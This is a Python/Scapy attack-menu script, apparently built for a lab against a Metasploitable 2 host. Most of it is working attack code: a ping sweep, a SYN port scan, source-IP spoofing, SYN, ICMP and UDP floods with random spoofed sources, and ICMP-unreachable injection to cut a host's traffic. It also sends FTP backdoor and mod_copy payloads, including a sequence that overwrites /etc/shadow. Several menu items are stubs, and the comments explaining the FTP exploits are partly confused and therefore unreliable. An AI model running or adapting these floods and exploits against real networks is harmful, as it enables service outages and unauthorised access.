from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP


def attack_to_perform(number):
    switch = {
        1: perform_reconnaissance,  # first recon attack
        2: perform_reconnaissance,  # second recon attack
        3: perform_dos,  # first dos attack
        4: perform_dos,  # second dos attack
        5: perform_dos,  # third dos attack
        6: perform_ftp_attack,  # ftp attack
        7: perform_sweep,  # ip address sweep (ok)
        8: perform_port_scan,  # port scan (ok)
        9: perform_ip_spoofing,  # ip spoofing (ok)
        10: perform_os_discovery,  # os discovery (ok)
        11: perform_syn_flood_attack,  # syn flood attack (?)
        12: perform_icmp_flood_attack,  # icmp flood attack (?)
        13: perform_udp_flood_attack,  # udp flood attack (?)
        14: perform_drop_communication,  # drop communication (not working)
        15: perform_arp_poisoning,  # arp poisoning (to implement)
        16: perform_special_attack,  # special attack
    }

    if number in switch:
        return switch[number]()
    else:
        return "Number out of range"


def print_attack_menu():
    print("Standard Attacks: -----------------------------------")
    print("(1) Reconnaissance Attack on network 192...")
    print("(2) Reconnaissance Attack on network 192...")
    print("(3) Denial of Service Attack on network 192...")
    print("(4) Denial of Service Attack on network 192...")
    print("(5) Denial of Service Attack on network 192...")
    print("(6) FTP Attack on Metasploitable 2")
    print("Custom Attacks: -------------------------------------")
    print("(7) IP Address Sweep")
    print("(8) Port Scan")
    print("(9) IP Spoofing")
    print("(10) Discover OS of Target")
    print("(11) SYN Flood Attack")
    print("(12) ICMP Flood Attack")
    print("(13) UDP Flood Attack")
    print("(14) Drop Communication")
    print("(15) ARP Poisoning")
    print("(16) Special Attack")
    print("-----------------------------------------------------")
    print()


# write a function for each attack in the print_attack_menu
# each function should return a string describing the attack
# the function should take any required input from the user
# and should call any other functions that are required to
# perform the attack


# Code to perform reconnaissance attack
def perform_reconnaissance(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    return "Reconnaissance performed on " + ip_addr


# Code to perform dos attack
def perform_dos(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to Dos: ")

    return "Dos performed on " + ip_addr


# (6) Code to perform ftp attack
def perform_ftp_attack():
    fsIP = "192.168.200.55"

    print("(1) Exploit the vsftpd 2.3.4 backdoor vulnerability")
    print("(2) Exploit the ProFTPD 1.3.3c mod_copy command execution vulnerability")
    print("(3) Exploit the ProFTPD 1.3.3c backdoor command execution vulnerability")
    # Get input from the user
    choice = input("Enter the number of the attack to perform: ")

    if choice == "1":
        payload = "USER anonymous:)\nPASS somepassword\n"
        return exploit_ftp(fsIP, payload)
    elif choice == "2":
        payload = "SITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
        return exploit_ftp(fsIP, payload)
    elif choice == "3":
        payload = "HELP ACIDBITCHEZ\n"
        return exploit_ftp(fsIP, payload)
    else:
        print("Invalid choice\n")
        return perform_ftp_attack()


"""
Exploiting the vsftpd 2.3.4 backdoor vulnerability:

Payload: "USER anonymous:)\nPASS somepassword\n"
Explanation:    This payload consists of the FTP commands to exploit the backdoor. 
                It starts with the USER command with the username set to "anonymous:)" 
                and the PASS command with the password set to "somepassword". 
                The backdoor vulnerability triggers when these specific commands are sent, 
                granting unauthorized access to the FTP server.

Exploiting the ProFTPD 1.3.3c mod_copy command execution vulnerability:

Payload: "SITE CPFR /proc/self/cmdline\nSITE CPTO /tmp/cmdline\nSITE CPFR /tmp/cmdline\nSITE CPTO /etc/shadow\n"
Explanation:    This payload utilizes the SITE command to exploit the mod_copy vulnerability. 
                It consists of a series of CPFR (Copy From) and CPTO (Copy To) commands. 
                It first copies the /proc/self/cmdline file to /tmp/cmdline and then copies it again 
                from /tmp/cmdline to /etc/shadow. This sequence of commands tricks the server into overwriting 
                the /etc/shadow file, which contains password hashes, with the contents of the /proc/self/cmdline file, 
                leading to unauthorized access to the password hashes.

Exploiting the ProFTPD 1.3.3c backdoor command execution vulnerability:

Payload: "HELP ACIDBITCHEZ\n"
Explanation:    This payload leverages the backdoor vulnerability in ProFTPD. It sends the HELP command 
                with an argument of "ACIDBITCHEZ". When this specific command with the correct argument is sent, 
                it triggers the backdoor and grants unauthorized access to the FTP server.
                These payloads are carefully crafted to exploit the specific vulnerabilities in each FTP server version
                and trigger the desired malicious behavior.
"""


# Destination port set to 21 (the FTP control port).
# The payload contains the malicious commands to exploit the backdoor.
def exploit_ftp(ip_addr, payload):
    # Craft the malicious packet to exploit the backdoor vulnerability
    packet = IP(dst=ip_addr) / TCP(dport=21, flags="PA") / payload

    # Send the malicious packet
    send(packet)

    return "Exploit packet sent."


# (7) Code to perform ip address sweep
def perform_sweep(packet_dst=None, packet_data=""):
    if not packet_dst:
        # Get input from the user
        packet_dst = input("Enter the destination IP: ")
        packet_data = input("Enter the packet data: ")

    live_hosts = []
    ip_range = [packet_dst + str(i) for i in range(1, 255)]

    for ip in ip_range:
        packet = IP(dst=ip) / ICMP() / packet_data
        reply = sr1(packet, timeout=0.1, verbose=0)
        if reply is not None and ICMP in reply:
            live_hosts.append(ip)

    print("Live hosts: ", live_hosts)

    return "Sweep towards " + packet_dst + " performed"


# (8) Code to perform port scan
def perform_port_scan(ip_addr=None, port_range=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    if not port_range:
        # Get input from the user
        port_range = input("Enter the port range to scan (e.g. 1-1000): ")

    # split the port range into two numbers
    port_range = port_range.split("-")
    # convert the port numbers to integers
    port_start = int(port_range[0])
    port_end = int(port_range[1])
    # create a list of ports to scan
    ports = range(port_start, port_end + 1)

    print(
        "Scanning "
        + ip_addr
        + " for open TCP ports in range ("
        + str(port_start)
        + " - "
        + str(port_end)
        + ")."
    )

    # create a list of open ports
    open_ports = []
    try:
        # scan the ports
        for port in ports:
            # create a TCP packet
            tcp_packet = IP(dst=ip_addr) / TCP(dport=port, flags="S")
            # send the packet and wait for a response
            tcp_response = sr1(tcp_packet, timeout=0.5, verbose=0)
            # if a response was received
            if tcp_response:
                # if the response is a SYN-ACK
                if tcp_response[TCP].flags == "SA":
                    # add the port to the list of open ports
                    open_ports.append(port)
            sr(
                IP(dst=ip_addr) / TCP(dport=tcp_response.sport, flags="R"),
                timeout=0.5,
                verbose=0,
            )
    except AttributeError:
        pass

    # print the open ports
    for port in open_ports:
        print("Port" + str(port) + " is open!")

    return "Port scan performed successfully on " + ip_addr


# (9) Code to perform ip spoofing
def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
    if not src_ip:
        # Get input from the user
        src_ip = input("Enter the source IP address: ")

    if not dst_ip:
        # Get input from the user
        dst_ip = input("Enter the destination IP address: ")

    if not packet_data:
        # Get input from the user
        packet_data = input("Enter the packet data: ")

    packet = IP(src=src_ip, dst=dst_ip) / packet_data

    packet_counter = 0

    # Continuously send the packet until the user decides to stop
    while True:
        packet_counter += 1
        send(packet)
        user_input = input("Press Enter to send another packet or 'q' to quit: ")
        if user_input.lower() == "q":
            break

    return "IP spoofing performed from {} to {} with data {}. Total packets sent: {}".format(
        src_ip, dst_ip, packet_data, packet_counter
    )


# (10) Code to perform os discovery
def perform_os_discovery(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    # Send TCP packet with no flags set
    packet = IP(dst=ip_addr) / TCP()
    response = sr1(packet, timeout=1, verbose=0)

    os_result = "Unknown OS"

    if response:
        os_result = os_fingerprint(response)

    return "OS discovery performed on {}. Detected OS: {}".format(ip_addr, os_result)


# Determine the OS based on the response packet TTL value
def os_fingerprint(packet):
    if packet.haslayer(IP):
        ip_ttl = packet[IP].ttl

        # Assuming Linux-based OSes have a TTL value of 64
        if ip_ttl == 64:
            return "Linux-based OS"

        # Assuming Windows-based OSes have a TTL value of 128
        elif ip_ttl == 128:
            return "Windows-based OS"

    # Fallback option if packet analysis does not provide OS information
    return "No OS information available"


# (11) Code to perform syn flood attack
def perform_syn_flood_attack(ip_addr=None, port="139"):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / TCP(dport=int(port), flags="S")

    # Create a flag to indicate whether to stop the attack
    stop_flag = threading.Event()

    def send_packet():
        while not stop_flag.is_set():
            send(packet, inter=0.005, verbose=0)

    # Crea un thread per eseguire l'attacco SYN flood
    attack_thread = threading.Thread(target=send_packet)
    attack_thread.start()

    # Wait for user input to stop the attack
    input("Press Enter to stop the attack...")

    # Set the stop flag to stop the attack
    stop_flag.set()

    # Wait for the attack thread to finish
    attack_thread.join()

    return "SYN flood attack performed on " + ip_addr + " to port " + port


# (12) Code to perform icmp flood attack
def perform_icmp_flood_attack(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / ICMP() / "1234567890"

    # Create a flag to indicate whether to stop the attack
    stop_flag = threading.Event()

    def send_packet():
        while not stop_flag.is_set():
            send(packet, inter=0.005, verbose=0)

    # Crea un thread per eseguire l'attacco SYN flood
    attack_thread = threading.Thread(target=send_packet)
    attack_thread.start()

    # Wait for user input to stop the attack
    input("Press Enter to stop the attack...")

    # Set the stop flag to stop the attack
    stop_flag.set()

    # Wait for the attack thread to finish
    attack_thread.join()

    return "ICMP flood attack performed on " + ip_addr


# (13) Code to perform udp flood attack
def perform_udp_flood_attack(ip_addr=None, port=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    if not port:
        # Get input from the user
        port = input("Enter the port to attack: ")

    packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())

    # Create a flag to indicate whether to stop the attack
    stop_flag = threading.Event()

    def send_packet():
        while not stop_flag.is_set():
            send(packet, verbose=0)

    # Create a separate thread to perform the attack
    attack_thread = threading.Thread(target=send_packet)

    # Start the attack thread
    attack_thread.start()

    # Wait for user input to stop the attack
    input("Press Enter to stop the attack...")

    # Set the stop flag to stop the attack
    stop_flag.set()

    # Wait for the attack thread to finish
    attack_thread.join()

    return "UDP flood attack performed on " + ip_addr + " to port " + port


# (14) Code to perform drop communication
def perform_drop_communication(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to attack: ")

    # Create a packet filter to capture packets from the specified IP address
    filter_str = "ip src {}".format(ip_addr)

    # Sniff packets and execute RST attack
    def packet_handler(packet):
        if packet.haslayer(ICMP):
            if packet[IP].src == ip_addr:
                # Create an ICMP Destination Unreachable packet to drop the communication
                drop_packet = ICMP(type=3, code=1)

                # Send the ICMP Destination Unreachable packet
                send(
                    IP(src=packet[IP].src, dst=packet[IP].dst) / drop_packet, verbose=0
                )
                send(
                    IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0
                )

                # Print the dropped communication
                print(
                    "Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
                        packet[IP].src,
                        packet[IP].dst,
                        packet[ICMP].type,
                        packet[ICMP].code,
                    )
                )

    # Start sniffing packets and call the packet_handler for each captured packet
    print("Start sniffing...")
    sniff(filter=filter_str, prn=packet_handler)

    return "Drop communication performed on IP address: {}".format(ip_addr)


# (15) Code to perform ARP poisoning
def perform_arp_poisoning(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    return "ARP poisoning performed on " + ip_addr


# (16) Code to perform Special attack
def perform_special_attack(ip_addr=None):
    if not ip_addr:
        # Get input from the user
        ip_addr = input("Enter the IP address to scan: ")

    return "Special attack performed on " + ip_addr


def main():
    # Print attack menu
    print_attack_menu()

    # Get input from the user
    while True:
        try:
            number = int(input("Select an attack: "))
            break  # Exit the loop if a valid number is entered
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    # Select the attack type
    atk = attack_to_perform(number)

    # Print the result
    print()
    print(atk)
    print()


if __name__ == "__main__":
    # Initial execution
    redo = ""

    # Redo loop
    while redo.lower() != "n":
        main()
        redo = input("Do you want to perform another attack? (y/n): ")
        print()
